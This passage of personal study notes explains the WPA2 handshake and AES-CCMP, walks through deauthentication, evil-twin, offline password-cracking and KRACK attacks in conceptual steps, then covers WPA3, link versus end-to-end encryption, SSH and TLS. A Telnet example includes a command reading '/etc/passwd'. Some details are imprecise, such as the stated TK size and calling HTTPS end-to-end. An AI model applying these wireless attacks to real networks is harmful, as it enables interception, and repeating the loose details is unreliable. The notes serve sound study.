AES-CBC-MAC(TK, header + ciphertext + PN) = 8 byte tag

Step 6: Build final frame
[Header][PN][Ciphertext][MIC]
        ↓ sent over air

Receiver gets packet:
Step 1: Extract PN = 000000000047
Step 2: Check PN > last received PN (replay check)
Step 3: Rebuild counter block
Step 4: Generate same keystream using TK + PN
Step 5: XOR ciphertext → recover plaintext ✅
Step 6: Verify MIC → confirms not tampered ✅


https://networklessons.com/wireless/wpa-and-wpa2-4-way-handshake
```
### WPA2 Full flow with an example:
### Stage 0 — Before You Do Anything

```
Your router is already:
Broadcasting beacons every 100ms:
"I am HomeNetwork, WPA2, channel 6"
        ↓
Your laptop passively hears beacon
"HomeNetwork" appears in your WiFi list
```
### Stage 1 — You Type the Password

```
You click "HomeNetwork"
Type: "MyWiFiPassword"
Click connect
        ↓
Your laptop immediately runs PBKDF2:
Input:  "MyWiFiPassword" + "HomeNetwork" (SSID as salt)
Rounds: 4096 iterations of SHA1
Output: PMK = 256 bit key
        "a3f9b2c8d4e1f7a0..."
        ↓
PMK sits in memory
Never transmitted anywhere
Never leaves your laptop
```

```
Simultaneously at the router:
Router already has PMK stored
Derived same way when you set up WiFi:
PBKDF2("MyWiFiPassword" + "HomeNetwork")
= identical PMK ✅
Both sides have same PMK without exchanging it
```

### Stage 2 — Association (Before Encryption)

```
Your laptop sends Association Request:
"I want to join HomeNetwork
 My MAC address is AA:BB:CC:DD:EE:FF
 I support WPA2, AES-CCMP"
        ↓
Router sends Association Response:
"Welcome, you are associated
 Now let us authenticate"
        ↓
Still no encryption yet
Management frames — plain text
```

### Stage 3 — Four Way Handshake Begins

**Message 1: AP → Your Laptop**

```
Router generates ANonce:
Random 256 bit number never used before
"7f3a9b2c4d8e1f0a..." (completely random)
        ↓
Router sends to your laptop:
"Here is my random number (ANonce)"
Plain text — no encryption yet
```
**Your laptop receives Message 1:**

```
Now laptop has:
PMK        ✅ (derived from password)
ANonce     ✅ (just received from AP)
Own MAC    ✅ (knows its own address)
AP MAC     ✅ (learned from beacon)
        ↓
Laptop generates SNonce:
Another random 256 bit number
"2c8f1a4b9d3e7f0c..." (completely random)
        ↓
Now laptop has everything needed to derive PTK:
PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
        ↓
PTK derived! Split immediately into:
KCK = first 128 bits  (handshake integrity)
KEK = next 128 bits   (GTK encryption)
TK  = last 256 bits   (data encryption)
```

**Message 2: Your Laptop → AP**

```
Laptop sends:
SNonce     → "Here is my random number"
MIC        → integrity check calculated using KCK
             proves laptop has correct PMK
             without revealing PMK itself

How MIC proves PMK knowledge:
MIC = AES(KCK, handshake_data)
KCK derived from PTK
PTK derived from PMK
If PMK wrong → KCK wrong → MIC wrong
AP can verify ✅
```
Note:-  Understand that client does not send **pairwise transient key (PTK)** or any other key just **Key Confirmation Key (KCK)** 

**AP receives Message 2:**

```
AP now has:
PMK        ✅ (stored from setup)
ANonce     ✅ (generated itself)
SNonce     ✅ (just received from laptop)
Both MACs  ✅
        ↓
AP derives same PTK:
PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
Same inputs → same PTK ✅
Same KCK, KEK, TK as laptop ✅
        ↓
AP verifies MIC using its KCK:
Recalculates MIC
Matches laptop's MIC ✅
"Laptop knows the correct password" ✅
```

Note: Remember PMK just sits on both the sides. 

**Message 3: AP → Your Laptop**

```
AP generates GTK:
Random key for broadcast traffic
All devices on network will share this
        ↓
AP sends to laptop:
**GTK encrypted with KEK**  → only laptop can decrypt
MIC calculated with KCK → proves AP has correct PMK
Waits for ACK
        ↓
Your laptop receives Message 3:
Verifies MIC using KCK ✅
Decrypts GTK using KEK ✅
        ↓
Laptop now installs TK:
"Loading TK into encryption engine"
"Setting Packet Number PN = 000000"
"Ready to encrypt data"
GTK also installed for receiving broadcasts
```

**Message 4: Your Laptop → AP**

```
Laptop sends ACK:
"I received the GTK
 Handshake complete
 Ready to communicate"
MIC attached to prove authenticity
KCK and KEK job done — retired
        ↓
AP receives ACK:
Installs TK on its side for data encryption 
Sets its own PN = 000000
Both sides ready ✅
```

GTK for broadcast traffic
---
### Stage 4 — Encrypted Communication Begins

```
You open YouTube in browser:
Browser sends HTTP request
        ↓
WiFi layer takes over:
Gets current PN = 000001
Builds counter block: TK + PN + MAC + headers
AES generates keystream
XOR with "GET youtube.com..." = ciphertext
MIC calculated and appended
        ↓
Encrypted data frame flies through air
        ↓
Router receives frame:
Checks PN > last received PN ✅ (replay check)
Rebuilds same counter block
AES generates same keystream
XOR decrypts ciphertext → recovers plaintext ✅
Verifies MIC ✅
Forwards request to internet
        ↓
PN increments to 000002 for next packet
Different keystream → different ciphertext
Even if same data sent twice ✅
```

---

### Stage 5 — Broadcast Traffic Uses GTK

```
Router needs to send ARP broadcast:
"Who has IP 192.168.1.1?"
        ↓
Router encrypts with GTK (not TK)
Sends to broadcast address
        ↓
Your laptop receives it
Your phone receives it
Your roommate's laptop receives it
All decrypt with same GTK ✅
None can read each other's personal traffic
(that uses individual PTKs) ✅
```

---

## Complete Picture in One View

```
YOU TYPE PASSWORD
        ↓
PBKDF2(password + SSID, 4096 rounds) → PMK
(same PMK on both sides, never transmitted)
        ↓
ASSOCIATION (plain text management frames)
        ↓
MESSAGE 1: AP sends ANonce
        ↓
MESSAGE 2: Laptop sends SNonce + MIC
           (PTK derived on laptop side)
           (MIC proves password knowledge)
        ↓
           AP derives same PTK
           AP verifies MIC ✅
        ↓
MESSAGE 3: AP sends GTK (encrypted with KEK)
           + MIC (proves AP legitimacy)
        ↓
           Laptop verifies MIC ✅
           Laptop decrypts GTK ✅
           Laptop installs TK, PN=0
        ↓
MESSAGE 4: Laptop sends ACK
           AP installs TK, PN=0
        ↓
AES-CCMP ENCRYPTED TRAFFIC BEGINS
TK + incrementing PN = unique key per packet
KCK and KEK job done, never used again
GTK used for broadcast traffic only
```

![[Pasted image 20260409190854.png]]
![[Pasted image 20260409190918.png]]
![[Pasted image 20260409190930.png]]
![[Pasted image 20260409190941.png]]
![[Pasted image 20260409191006.png]]

## Why Does Laptop Send MIC Again in Phase 3?

You are right to notice this. The word MIC appears in multiple places but they are completely different MICs with different keys and different purposes.

```
MIC in Message 2 (handshake):
Key used:    KCK (Key Confirmation Key)
Purpose:     "I know the correct password"
Protects:    The handshake message itself
Job:         Authentication — prove identity
Calculated:  Once, during handshake only

MIC in every data frame (Phase 3):
Key used:    TK (Temporal Key)
Purpose:     "This packet was not tampered with"
Protects:    Each individual data frame
Job:         Integrity — prove data unmodified
Calculated:  Fresh for every single packet
```

### WPA2 Weaknesses:

1. Man-in-the-Middle: Frames lack integrity protection — disassociate messages from rogue hosts aren't identified as fake

2. Incomplete authentication: Access point validation can be bypassed

3. Exhaustive key search: Weak passwords are still vulnerable to brute force

4. Attacks are particularly effective against weak passwords

## Disassociation Attack Explained

```
Normal wifi management:
AP sends deauth → "client you are disconnected"
Client sends deauth → "AP I am leaving"

Problem:
These management frames have NO cryptographic signature
Anyone can forge them
        ↓
Attacker sits nearby
Sends fake deauth to client:
"Source: [AP's MAC address]"  ← spoofed
"You are disconnected"
        ↓
Client sees AP's MAC address
Believes message is from real AP
Disconnects immediately ❌
```

This is called a **deauthentication attack** and it's used for:

```
1. Just disrupting service (DoS)
2. Forcing reconnection to capture handshake
3. Evil twin attack — fake AP ready to intercept reconnection
```

Note: i.e, susceptible to  Man-in-the-Middle:

WPA3 fixes this with **Management Frame Protection (MFP)**,  finally cryptographically signs management frames.


## Incomplete Authentication — AP Validation Bypassed

This is the **Evil Twin attack:**

```
Client knows:
→ Network name (SSID) = "CoffeeShopWiFi"
→ Password = "coffee123"

Client does NOT verify:
→ Is this the REAL CoffeeShopWiFi AP?
→ Or a fake one with same name and password?
        ↓
Attacker sets up fake AP:
SSID: "CoffeeShopWiFi"  ← same name
Password: "coffee123"    ← same password
Stronger signal than real AP
        ↓
Client connects to fake AP ✅
Client thinks everything is normal
All traffic flows through attacker ❌
```

```
Why can't client detect fake AP?
WPA2 only verifies: "do you know the password?"
Does NOT verify: "are you the legitimate AP?"
        ↓
Attacker knows the password too
Passes the only check that exists
No certificate, no identity proof required
```

WPA2-Enterprise with certificates partially fixes this — the AP must present a valid certificate proving identity.

## Susceptible to Weak passwords

## The Offline Attack — No Replay Needed

```
Attacker takes captured data home
Runs this loop offline:

Guess password = "password123"
        ↓
Run PBKDF2("password123" + SSID) → candidate PMK
        ↓
Use candidate PMK + captured ANonce + captured SNonce
+ both MAC addresses
        ↓
Calculate candidate PTK
        ↓
Extract KCK from candidate PTK
        ↓
Calculate candidate MIC using KCK
        ↓
Compare candidate MIC with captured MIC:
Match?    → password found ✅
No match? → try next password

```
# **The attacker never touches the network again.**

```
No replay of handshake
No interaction with AP
No interaction with client
Purely mathematical computation
Done entirely on attacker's own machine
```

## What Each Key ACTUALLY Prevents

**KCK + MIC:**

```
Prevents:
Attacker modifying handshake messages in transit
"Let me change the SNonce to something I control"
→ MIC fails → rejected ✅

Does NOT prevent:
Attacker READING the handshake
MIC is visible in plain air
Attacker captures it and uses it for offline comparison
```

**Nonces (ANonce + SNonce):**

```
Prevents:
Replay attacks on sessions
"Let me replay last week's handshake"
→ New session = new nonces
→ Old handshake useless ✅

Does NOT prevent:
Offline cracking
Attacker uses the captured nonces
As INPUT to their password guessing
The nonces HELP the attacker actually
Because attacker needs them to verify guesses
```

**KEK:**

```
Prevents:
Someone intercepting GTK during delivery
GTK encrypted so only real client reads it ✅

Does NOT prevent:
Offline cracking
KEK is derived from PTK
If attacker cracks password they get KEK too
```

**TK:**

```
Prevents:
Anyone reading your data traffic ✅
Per-packet rotation prevents key recovery ✅

Does NOT prevent:
Offline cracking of the password
TK is derived from PTK
Cracking password → deriving PTK → getting TK
```

---

## The Core Issue — What Nothing Can Prevent

```
All these keys protect against:
→ Eavesdropping on data ✅
→ Replaying old sessions ✅
→ Tampering with packets ✅
→ Man in the middle (partially) ✅

None of them protect against:
→ Mathematical brute force of the PASSWORD

Because:
The handshake MUST fly through the air
The handshake MUST contain enough information
for both sides to verify they share the same PMK
        ↓
That verification information (MIC, nonces)
is exactly what the attacker needs
to verify their password guesses offline
        ↓
You cannot hide the handshake
You cannot make it unreadable
It has to be there for WiFi to work
```
## KRACK Attack

## Recap of What We Established

```
Per-packet encryption uses:
TK + Packet Number (PN) → unique keystream per packet

PN increments every packet:
Packet 1: PN=000001 → keystream_1
Packet 2: PN=000002 → keystream_2
Packet 3: PN=000003 → keystream_3

Same PN = same keystream = DISASTER
(XOR two ciphertexts → expose plaintext)
        ↓
WPA2 designed so PN NEVER repeats
Strict counter, always incrementing
This was the whole point

```
## How KRACK Exploits This

The attacker **deliberately** causes this retransmission:

```
Step 1: Attacker positions between client and AP
        (MitM position — uses the deauth attack
        we discussed earlier to force reconnection
        through attacker's relay)

Step 2: Normal handshake begins
Message 1: AP → Client  ✅
Message 2: Client → AP  ✅
Message 3: AP → Client  ✅
        ↓
Client installs TK, PN = 000000
Client sends Message 4 → AP

Step 3: Attacker BLOCKS Message 4
AP never receives ACK
AP thinks Message 3 was lost
        ↓
Client starts sending data:
Packet 1: PN=000001 → keystream_1 → ciphertext_1
Packet 2: PN=000002 → keystream_2 → ciphertext_2
Packet 3: PN=000003 → keystream_3 → ciphertext_3
Attacker captures all of these ✅

Step 4: AP retransmits Message 3
(because it never got ACK)
        ↓
Attacker FORWARDS Message 3 to client
Client receives Message 3 again
Protocol says: "reinstall the key"
Client reinstalls TK → PN RESETS TO 000000 ❌

Step 5: Client sends data again:
Packet 1: PN=000001 → keystream_1 → ciphertext_1'
Packet 2: PN=000002 → keystream_2 → ciphertext_2'

SAME PN = SAME TK = SAME KEYSTREAM
Different data XORed with same keystream
```

---

## Why Nonce Reuse is Catastrophic

Remember from our WEP and RC4 discussion:

```
Same keystream used twice:

ciphertext_1  = plaintext_A XOR keystream_1
ciphertext_1' = plaintext_B XOR keystream_1
        ↓
XOR them together:
ciphertext_1 XOR ciphertext_1'
= plaintext_A XOR keystream_1 XOR plaintext_B XOR keystream_1
= plaintext_A XOR plaintext_B
(keystreams cancel out!)
        ↓
Attacker has plaintext_A XOR plaintext_B
If attacker knows ANY of the plaintext
(HTTP always starts with "GET /" for example)
Can recover the other plaintext ✅
Can recover the keystream ✅
Can decrypt ALL traffic with that keystream ✅
```

---

## Is Nonce Reuse Built Into WPA2?

To directly answer your question — **no, it is not supposed to happen.** But:

```
WPA2 protocol specifies:
"PN starts at 0 when key is installed"
        ↓
This rule exists for legitimate reasons:
Fresh session = fresh counter
Makes perfect sense normally
        ↓
But the protocol ALSO says:
"If Message 3 is received again, reinstall key"
This is the retransmission handling rule
Also makes sense for reliability
        ↓
KRACK combines these two innocent rules:
Rule 1: Installing key resets PN to 0
Rule 2: Receiving Message 3 again = reinstall key
        ↓
Force Message 3 retransmission
→ Key gets reinstalled
→ PN resets to 0
→ Nonce reused
→ Keystream reused
→ Everything breaks
```

This is why the slide says:

```
"Affects the 4-way handshake itself
 not a specific cipher weakness"
        ↓
AES-CCMP is perfectly secure ✅
The nonce reuse breaks it ❌
But nonce reuse caused by handshake logic
Not by AES itself
```

---

## What Attacker Can Do With Nonce Reuse

```
REPLAY:
Captured old packet with PN=000001
Reset forces PN back to 000001
Attacker replays old packet
Client accepts it (PN looks valid) ✅

DECRYPT:
Two ciphertexts with same keystream
XOR reveals plaintext relationship
Known plaintext → full keystream recovery
Decrypt all traffic ✅

FORGE:
Once keystream known:
Attacker creates own message
XOR with keystream → valid looking ciphertext
Inject into traffic
Receiver decrypts → accepts as legitimate ✅
MIC can even be forged in TKIP mode


```
## How It Was Fixed

```
Patch approach:
Client should check:
"Have I already installed this key?"
"Is my PN already past zero?"
        ↓
If yes → ignore the retransmitted Message 3
Do NOT reinstall
Do NOT reset PN
        ↓
Retransmission handled at protocol level
Without resetting the cryptographic state
```

### Why it led to WPA3:
KRACK showed WPA2's handshake
had fundamental design issues
Patching was possible but messy
        ↓
WPA3 redesigned the handshake entirely
Using SAE (Simultaneous Authentication of Equals)
Completely different mechanism
Not vulnerable to this class of attack
Even if messages are replayed
SAE does not reinstall keys
Does not reset counters

### WiFi Protected Access (WPA) 3

Terminologies in WPA3

WPA3 introduces **Management Frame Protection (MFP):** 
Cryptographically signs management frames 
Even deauth frames get integrity check Forged deauth → MIC fails → client ignores it ✅

## Term 1 — SAE (Simultaneous Authentication of Equals)

**What it is:**

SAE is the replacement for WPA2's PSK handshake. It is the core authentication mechanism of WPA3-Personal.

**What "Simultaneous" means:**

```
WPA2 PSK — NOT simultaneous:
AP sends ANonce FIRST → client responds
One side goes first = asymmetric
Client proves to AP it knows password
AP never truly proves anything back
        ↓
WPA3 SAE — truly simultaneous:
Both sides commit at the same time
Neither goes first
Both prove knowledge simultaneously
Neither can learn from the other's message
Equal participants — neither has advantage
```

**What "Equals" means:**

```
WPA2:
Client = supplicant (inferior role)
AP     = authenticator (superior role)
Relationship is hierarchical
AP dictates terms

WPA3 SAE:
Client = equal
AP     = equal
Both prove to each other simultaneously
No hierarchy — genuine mutual authentication
```

**The key property that matters most:**

```
WPA2 PSK handshake:
Captured handshake → offline cracking possible
Attacker has everything needed to guess offline

SAE handshake:
Captured SAE exchange → useless for offline cracking
Attacker gains ZERO crackable information
Must interact with real AP live to guess
AP can throttle attempts → brute force impractical
```
### Term 2 — Dragonfly Key Exchange

Dragonfly is the specific mathematical protocol that makes SAE work. It is an improved version of Diffie-Hellman specifically designed for password authentication.

**Why regular DH is not enough:**

```
Regular Diffie-Hellman (from TLS discussion):
Uses large prime numbers
Designed for key exchange between servers
Not designed around passwords
        ↓
If you try to use DH with passwords:
Password is low entropy (guessable)
Attacker can run offline dictionary attack
against the DH exchange
Same problem as WPA2 ❌

```
## Term 3 — Perfect Forward Secrecy (PFS)

**Definition:**

PFS means that compromise of long-term secrets (the password) cannot be used to decrypt past recorded sessions.

**Without PFS (WPA2):**

```
Password → PBKDF2 → PMK (static, tied to password)
PMK + ANonce + SNonce → PTK

Problem:
ANonce and SNonce travel in plain air
Attacker records them
Later steals password
Derives PMK from password
Derives old PTK from PMK + recorded nonces
Decrypts all recorded sessions ❌
```

**With PFS (WPA3 SAE):**

```
Each SAE exchange generates fresh PMK
Using ephemeral random values
That are never stored anywhere
Destroyed after session ends
        ↓
Attacker records all WiFi traffic for a year
Later steals password
        ↓
Cannot reconstruct old PMKs
Because old ephemeral randoms are gone
Password alone is not enough
Past sessions protected permanently ✅
```

**The ephemeral values are the key:**

```
WPA2:
PMK = function of password (deterministic)
Same password → same PMK → can reconstruct

WPA3:
PMK = function of password AND ephemeral randoms
Same password + different randoms = different PMK
Randoms gone after session = PMK unrecoverable
```

---

## Term 4 — OWE (Opportunistic Wireless Encryption)

**Problem it solves:**

```
Open networks (airports, cafes, hotels):
No password → no encryption
Everyone's traffic visible to everyone
Passive eavesdropping trivial ❌
        ↓
Can't just add a password:
Defeats the purpose of open access
Password on chalkboard = useless security
```

**OWE solution:**

```
User experience: unchanged (no password)
Security: automatic per-device encryption
        ↓
How:
Device connects to open network
Automatic DH key exchange with AP
Each device gets unique encryption key
No credentials required
No user action needed
        ↓
Result:
Person next to you cannot read your traffic
Even though no password was used
```

**OWE limitation:**

```
OWE protects against:
Passive eavesdroppers ✅
People sniffing traffic ✅

OWE does NOT protect against:
Evil twin attack ❌
Attacker sets up fake open AP
OWE still encrypts — to the fake AP
Traffic still flows through attacker
```
## Link Encryption

## What is a Hop?

A hop is simply **one step in the journey** from source to destination:

```
Your PC → Router1 → Router2 → Router3 → Google

Hop 1: Your PC    → Router1
Hop 2: Router1    → Router2
Hop 3: Router2    → Router3
Hop 4: Router3    → Google

Each arrow = one hop
Total journey = 4 hops
```

Think of it like a flight with layovers:

```
Boston → London → Dubai → Singapore

Each flight = one hop
You stop at each city = intermediate node
```

---
## What is a Node?

Node = **any device that handles your data along the way:**

```
Your PC → [Router1] → [Router2] → [Router3] → Google
           node1       node2       node3

Nodes are:
→ Routers
→ Switches  
→ Gateways
→ Any intermediate device that forwards traffic
```

---

## Link Encryption — How it Works Hop by Hop

```
Your PC encrypts data
        ↓
Sends to Router1 (hop 1)
Router1 DECRYPTS entire packet
Reads: "where does this go?"
Router1 RE-ENCRYPTS
Sends to Router2 (hop 2)
        ↓
Router2 DECRYPTS entire packet
Reads: "where does this go?"
Router2 RE-ENCRYPTS
Sends to Router3 (hop 3)
        ↓
And so on until destination
```

Every single node decrypts and re-encrypts — this is what "encrypts at each hop" means.

## "Data Partially Exposed in Sending Host"

This is a subtle but important point:

```
Your PC (sending host) has to:
1. Take your original plaintext message
2. Encrypt it for the first hop
        ↓
At the MOMENT before encryption:
Data exists in plain text in your PC's memory
Operating system can see it
Other processes on your PC can potentially see it
Malware on your PC can see it
        ↓
"Partially exposed" = exists unencrypted 
in memory before first encryption happens
```

## End to End Encryption"

1. Encrypts from source to destination — intermediate nodes can't read it
2. Data protected in sending host
3. Data protected through all intermediate nodes
4. Applied by user application
5. User selects algorithm
6. Each user selects individually
7. Usually software, occasionally hardware
8. User can selectively encrypt individual items
9. Requires one key per pair of users
10. Provides user authentication

## 1. If Data is Encrypted How Do Intermediate Nodes Know Where to Hop?

This is the most important question. The answer is:

**E2E only encrypts the PAYLOAD (content) — NOT the headers.**

```
Every packet has two parts:

┌─────────────────────────────────────┐
│ HEADER                              │
│ Source IP: 192.168.1.5              │ ← NEVER encrypted
│ Destination IP: 142.250.80.46       │ ← routers read this
│ Port: 443                           │ ← never encrypted
├─────────────────────────────────────┤
│ PAYLOAD (content)                   │
│ "Hey Bob how are you doing today"   │ ← THIS is encrypted
│ → gibberish to intermediate nodes   │
└─────────────────────────────────────┘
```

So routers see:

```
Header: "Destination = Google's IP"
→ I know where to forward this ✅

Payload: "xK92#mP@!zL..."
→ I have no idea what this says ✅
→ Don't need to — just forward it
```

Think of it like a sealed envelope:

```
Envelope outside = IP header
→ Postman reads: "deliver to 123 Main Street"
→ Postman can forward it correctly ✅

Inside the envelope = encrypted payload
→ Postman cannot open or read it ❌
→ Only recipient can open it ✅
```

This is also the difference from link encryption:

```
Link encryption:    encrypts EVERYTHING including headers
                    routers must decrypt to read headers
                    then re-encrypt before forwarding

E2E encryption:     encrypts ONLY payload
                    headers always visible
                    routers forward without decrypting anything
```

---

## 2. "Applied by User Application" — Is it Signal/Telegram?

Yes exactly! The application handles encryption — but with an important distinction between Signal and Telegram:

**Signal:**

```
You type: "Hey Bob"
        ↓
Signal app encrypts it BEFORE sending
"xK92#mP@!zL..."
        ↓
Encrypted data leaves your phone
Signal's own servers only see gibberish
Even Signal company cannot read your messages ✅
True E2E encryption ✅
```

**Telegram:**

```
Regular Telegram chats:
NOT end-to-end encrypted by default ❌
Telegram servers can read your messages
Encrypted between you and Telegram server (link encryption)
But Telegram sees plaintext on their server

Secret Chats only:
E2E encryption enabled ✅
But not default — user must activate it
```
**Link encryption** means the data is encrypted _in transit_ — i.e., between your device and Telegram's server. So nobody on the network (like your ISP or a man-in-the-middle attacker) can intercept and read it. The connection itself is protected.

**But** once the message arrives at Telegram's server, it gets _decrypted_. Telegram stores it in plaintext (or with their own encryption keys they control). So Telegram _can_ read it.

**WhatsApp:**

```
Uses Signal's protocol
E2E by default for messages ✅
BUT metadata visible to Facebook/Meta:
Who you talk to, when, how often
Content protected, patterns exposed
```

**HTTPS (your browser):**

```
Also E2E encryption via TLS
Browser encrypts before sending
Google/website decrypts at destination
ISP/routers see only encrypted gibberish ✅
```

---

## 3. "User Selects Algorithm" — How?

This happens at different levels depending on the application:

**In your browser (most visible example):**

```
When you connect to a website
Browser and server negotiate algorithm:

Browser says: "I support these algorithms:
→ AES-256-GCM ✅
→ ChaCha20 ✅
→ AES-128-GCM ✅"

Server says: "I prefer AES-256-GCM"
Both agree → use AES-256-GCM

You can actually see this:
Chrome → click padlock → Connection is secure
→ shows exact algorithm being used
```

**In email (PGP):**

```
User explicitly chooses:
→ RSA 4096 bit keys
→ AES-256 for content
→ SHA-256 for signing
Full manual control
```

**In Signal/WhatsApp:**

```
Algorithm pre-selected by app developers
User has no choice — Signal Protocol always used
"User selects" here means:
Choosing WHICH app to use = choosing algorithm
Using Signal = choosing Signal Protocol
Using PGP email = choosing PGP algorithm
```

**In enterprise settings:**

```
IT admin configures allowed algorithms
Employees use whatever admin configured
Similar to link encryption's admin control
But at application level not network level
```

---

## 4. "Requires One Key Per Pair of Users"

This is fundamentally different from link encryption's one key per pair of hosts.

```
Link encryption (one key per host pair):
Router1 ←→ Router2 = Key K1
All users sharing that route use K1
100 users through same router = same key K1

End-to-End (one key per USER pair):
Alice ←→ Bob   = Key K_AB
Alice ←→ Carol  = Key K_AC
Bob   ←→ Carol  = Key K_BC
Alice ←→ Dave   = Key K_AD

Each RELATIONSHIP has its own unique key
```

**How keys are generated in practice:**

```
Alice opens Signal and messages Bob for first time:
        ↓
Signal automatically:
1. Generates unique key pair for Alice-Bob conversation
2. Exchanges public keys
3. Creates shared secret using Diffie-Hellman
4. This shared secret = their unique encryption key
        ↓
Alice opens Signal and messages Carol:
Completely different key generated
Alice-Carol key has nothing to do with Alice-Bob key
```

**Why one key per user pair matters:**

```
If Alice-Bob key is compromised:
→ Only Alice-Bob conversation exposed
→ Alice-Carol conversation still safe ✅
→ Bob-Carol conversation still safe ✅

Compare to link encryption:
If Router1-Router2 key K1 is compromised:
→ EVERY user's traffic on that link exposed ❌
→ All 1000 users affected simultaneously
```

**The scaling math:**

```
10 users who all message each other:
Need 45 unique keys (one per pair)

Formula: n(n-1)/2
10 users: 10×9/2 = 45 keys
100 users: 100×99/2 = 4,950 keys
1000 users: ~500,000 keys

Each key stored only on the two users' devices
Central server stores nothing ✅
```

---

## 5. "Provides User Authentication"

This is where E2E goes beyond just encryption — it also proves **who you're talking to.**

```
Problem without authentication:
Alice thinks she's messaging Bob
But actually messaging attacker
(Man in the Middle attack)
Attacker forwards to Bob
Both think they're talking to each other
Attacker reads everything ❌
```

**How E2E solves this:**

```
Each user has:
Private key → kept secret on your device only
Public key  → shared with everyone openly

When Alice messages Bob:
Alice encrypts with BOB'S public key
        ↓
Only Bob's private key can decrypt it
Attacker cannot decrypt without Bob's private key ✅
        ↓
Bob signs his response with HIS private key
Alice verifies signature using Bob's public key
Signature valid = definitely came from Bob ✅
Attacker cannot fake Bob's signature 
without Bob's private key ✅
```

**How Signal implements this:**

```
Safety numbers / Security codes:
Signal generates a unique code for each conversation
Alice and Bob can compare codes out of band
(meet in person, call each other)
Codes match = definitely talking to each other ✅
Codes don't match = someone intercepting ❌
```

**Compare to link encryption's node authentication:**

```
Link encryption → node authentication:
"This message came from Router1" ✅
Proves machine identity
Says nothing about which USER sent it

E2E → user authentication:
"This message came from Alice specifically" ✅
Proves individual person's identity
Much stronger — tied to person not machine
```

---

## Full Summary

```
Headers unencrypted    → routers read destination, forward correctly
                         only payload encrypted, routing works fine

Applied by app         → Signal, WhatsApp, HTTPS, PGP
                         encryption happens before data leaves app
                         network/OS never sees plaintext

User selects algorithm → choosing the app = choosing algorithm
                         or manually in PGP/browser settings

One key per user pair  → Alice-Bob = unique key
                         compromise one pair = only that chat exposed
                         much better isolation than link encryption

User authentication    → cryptographic proof of WHO sent the message
                         tied to individual person's private key
                         not just which machine it came from
```

## Secure Connection Protocols

🖥SSH (Secure Shell)

Originally for UNIX, now on most OSes. **Provides authenticated, encrypted path to OS command line over the network.** Replaces insecure Telnet, rlogin, rsh. Protects against spoofing and modification. Network application level.

## What is Telnet?

Telnet was the original way to **remotely control another computer** over a network:

```
Before SSH existed:
Admin sits at their desk
Wants to control a server in another room/city
        ↓
Opens Telnet connection
Types commands
Server executes them
Admin sees output
        ↓
Exactly like sitting at the server physically
But done remotely over network
```

**The catastrophic problem — everything plain text:**

```
Admin types:
Username: admin
Password: secretpassword123
Command: cat /etc/passwd

ALL of this travels across network as:
"admin"
"secretpassword123"  ← password visible to anyone!
"cat /etc/passwd"

Anyone sniffing the network sees:
→ Username ✅
→ Password ✅
→ Every command typed ✅
→ Every output returned ✅
Complete exposure ❌
```

It's like shouting your password across a crowded room — everyone hears it.

---

## What is rlogin?

**Remote Login** — another old UNIX tool for logging into remote machines:

```
rlogin was even MORE trusting than Telnet:

Configured "trusted hosts" in a file called .rhosts:
"I trust anyone claiming to come from these machines"
        ↓
If your machine was listed as trusted:
No password needed at all
Just connect and you're in ✅ (from security perspective ❌)
```

**The problem:**

```
.rhosts file says:
"Trust connections from 192.168.1.5"
        ↓
Attacker spoofs IP as 192.168.1.5
rlogin sees: "connection from trusted IP"
Grants access with NO password ❌
        ↓
Remember IP spoofing from our DDoS discussion?
rlogin was completely broken by it
Attacker just fakes trusted IP = full access
```

Also like Telnet — everything transmitted in plain text.

---

## What is rsh?

**Remote Shell** — similar to rlogin but specifically for executing single commands remotely:

```
Telnet  = full interactive remote terminal session
rlogin  = full remote login session
rsh     = run ONE specific command on remote machine

Example:
rsh server1 "ls -la /home"
→ runs ls command on server1
→ returns output to you
→ without full login session
```

**Same problems as rlogin:**

```
→ Used .rhosts trust file
→ No password if IP is trusted
→ Everything transmitted in plain text
→ Completely vulnerable to IP spoofing
→ No encryption whatsoever
```

## All Three Compared

![[Pasted image 20260408213216.png]]

## How SSH Replaced All Three

```
SSH provides:
→ Full remote terminal (replaces Telnet) ✅
→ Remote login (replaces rlogin) ✅
→ Remote command execution (replaces rsh) ✅

But adds:
→ Full encryption of everything
→ Strong authentication
→ Protection against spoofing
→ Host verification
All three replaced by one secure protocol ✅
```

**What SSH encrypts that Telnet didn't:**

```
Telnet sends:           SSH sends:
"admin"          →      "xK92#mP@!zL..."
"password123"    →      "9Bx!2#nQ@mK..."
"ls -la"         →      "pL3$mN!7@xK..."
"secret file"    →      "2Kx#9mP@!nL..."

Every single character encrypted
Even timing of keystrokes is obfuscated
```

## "Network Application Level" — What Does This Mean?

Remember our OSI layer discussion from DDoS attacks?

```
Layer 7 - Application  ← SSH lives here
Layer 6 - Presentation
Layer 5 - Session
Layer 4 - Transport    ← TCP lives here
Layer 3 - Network      ← IP lives here
Layer 2 - Data Link
Layer 1 - Physical
```

"Network application level" means SSH operates at **Layer 7** — the application layer:

```
SSH is NOT built into the network infrastructure:
→ Routers don't know about SSH
→ Switches don't know about SSH
→ It's just an application running on top of TCP/IP

Like how:
HTTP is application level → runs on top of TCP/IP
FTP is application level  → runs on top of TCP/IP
SSH is application level  → runs on top of TCP/IP
```

**What this means practically:**

```
SSH connection:
┌─────────────────────────────────────┐
│ Layer 7: SSH protocol               │ ← encryption, auth
│          (your actual commands)     │
├─────────────────────────────────────┤
│ Layer 4: TCP                        │ ← reliable delivery
│          Port 22                    │ ← SSH default port
├─────────────────────────────────────┤
│ Layer 3: IP                         │ ← routing to destination
├─────────────────────────────────────┤
│ Layer 1/2: Physical/Data Link       │ ← actual transmission
└─────────────────────────────────────┘

SSH handles encryption at Layer 7
Hands encrypted data to TCP at Layer 4
TCP handles reliable delivery
IP handles routing
```

**Why application level matters:**

```
Application level = runs anywhere TCP/IP runs
No special network hardware needed
No router configuration needed
Works over:
→ Your home WiFi ✅
→ Corporate network ✅
→ Internet ✅
→ Any TCP/IP network ✅
```
## 🔒SSL/TLS

https://www.geeksforgeeks.org/computer-networks/secure-socket-layer-ssl/
https://www.geeksforgeeks.org/computer-networks/transport-layer-security-tls/

SSL/TLS is more accurately described as sitting **between Layer 4 and Layer 7:**

```
Layer 7 - Application  (HTTP, FTP, SMTP)
─────────────────────────────────────────
Layer 5 - TLS/SSL sits HERE
          (between application and transport)
─────────────────────────────────────────
Layer 4 - Transport (TCP)
```

```
HTTPS = HTTP + TLS
HTTP  → hands data to TLS
TLS   → encrypts it
TLS   → hands encrypted data to TCP
TCP   → delivers it reliably
```

---

